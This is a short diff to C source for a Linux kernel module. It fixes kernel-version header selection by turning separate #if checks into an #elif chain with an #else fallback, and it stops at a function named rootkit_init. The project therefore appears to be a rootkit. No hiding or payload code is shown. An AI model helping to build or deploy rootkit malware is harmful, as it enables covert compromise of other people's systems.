@@ -8,12 +8,14 @@
 
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(3,0,0)) && (LINUX_VERSION_CODE < KERNEL_VERSION(4,0,0))
 #include "version/k3.h"
-#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4,0,0)) && (LINUX_VERSION_CODE < KERNEL_VERSION(5,0,0))
+#elif (LINUX_VERSION_CODE >= KERNEL_VERSION(4,0,0)) && (LINUX_VERSION_CODE < KERNEL_VERSION(5,0,0))
 #include "version/k4.h"
-#if (LINUX_VERSION_CODE >= KERNEL_VERSION(5,0,0)) && (LINUX_VERSION_CODE < KERNEL_VERSION(6,0,0))
+#elif (LINUX_VERSION_CODE >= KERNEL_VERSION(5,0,0)) && (LINUX_VERSION_CODE < KERNEL_VERSION(6,0,0))
 #include "version/k5.h"
-#if (LINUX_VERSION_CODE >= KERNEL_VERSION(6,0,0))
+#elif (LINUX_VERSION_CODE >= KERNEL_VERSION(6,0,0))
 #include "version/k6.h"
+#else
+#include "version/k3.h"
 #endif
 
 static int __init rootkit_init(void)
